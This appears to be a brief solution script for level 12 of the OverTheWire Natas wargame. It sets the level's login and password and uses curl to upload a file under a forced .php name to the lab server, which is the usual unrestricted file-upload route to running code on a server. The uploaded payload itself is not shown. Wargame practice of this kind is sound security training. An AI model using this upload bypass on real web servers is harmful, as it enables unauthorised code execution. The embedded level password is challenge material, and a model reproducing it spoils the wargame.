usr="natas12"
psw="EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
filename="ciao.php"
file="natas12.upload.html"

curl --user "$usr:$psw" -X POST --form "MAX_FILE_SIZE=1000" --form "filename=$filename" --form "uploadedfile=@$file;filename=prova.php" http://natas12.natas.labs.overthewire.org/ 
